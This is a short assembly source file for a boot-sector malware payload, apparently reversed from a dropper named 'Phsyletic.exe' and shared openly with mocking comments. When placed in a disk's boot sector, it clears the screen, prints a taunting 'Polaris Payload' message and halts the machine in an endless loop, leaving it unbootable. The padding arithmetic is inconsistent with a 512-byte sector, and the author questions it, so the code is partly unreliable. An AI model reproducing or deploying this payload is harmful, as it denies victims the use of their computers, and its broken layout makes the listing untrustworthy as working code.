BITS 16
org 0x7c00

; ok this is actually stolen from a tutorial i have seen... but let's make
; harder the life for the skids (i wonder if they are going to be enough smart to look
; for an easier example...)

; File Name   : polaris.bin (from Phsyletic.exe)
; Format      : Binary file
; Base Address: 0000h Range: 0000h - 0200h Loaded length: 0200h -> 512 bytes

	jmp     loc_2 ; minor fix

; enjoy reversed source <3, also what the fuck is that 0 filling?

loc_2:                                  
	call    sub_24
	mov     ax, cs
	mov     ds, ax
	mov     si, 7C33h
	call    $+3
	push    ax
	cld
	
loc_11:                               
	mov     al, [si]
	cmp     al, 0
	jz      loc_1D
	call    sub_1F
	inc     si
	jmp     loc_11

loc_1D:                                
	jmp     loc_1D ; loop


sub_1F:               ; printchar - tty
	mov     ah, 0Eh
	int     10h        
	retn

sub_24:             ; clearscreen
	mov     ah, 7
	mov     al, 0
	mov     bh, 9   
	mov     cx, 0
	mov     dx, 184Fh
	int     10h           

retn
msg db 'Whoa, Where did you come from?',0Dh,0Ah,'Well, Welcome to the Polaris Payload!',0Dh,0Ah,'You are staying here for long >:D',0 ; what is the name malware, polaris or phsyletric?

times (0x365 - 0x200) - ($-$$) dw 0 ; what the fuck?
dw 0xaa55